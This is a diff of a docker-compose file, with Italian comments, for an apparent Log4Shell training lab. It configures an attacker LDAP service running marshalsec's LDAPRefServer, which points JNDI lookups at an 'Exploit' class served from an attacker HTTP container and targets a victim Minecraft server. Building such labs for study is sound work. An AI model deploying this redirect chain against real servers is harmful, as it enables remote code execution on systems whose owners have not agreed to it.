@@ -27,21 +27,20 @@ services:
   # ─────────────────────────────────────────────────────────
   ldap-attacker:
     build:
-      context: .
-      dockerfile: Dockerfile.ldap
+      context: ./ldap-server
     container_name: ldap-attacker
     # Attende che http-attacker sia healthy prima di partire
     depends_on:
       http-attacker:
         condition: service_healthy
-    networks:
-      - lab-log4shell
     # L'URL punta a http-attacker (risolto via DNS interno Docker)
     command: >
       java -cp /app/marshalsec.jar
       marshalsec.jndi.LDAPRefServer
       "http://http-attacker:8888/#Exploit"
       1389
+    networks:
+      - lab-log4shell
 
   # ─────────────────────────────────────────────────────────
   # 3. SERVER MINECRAFT VITTIMA
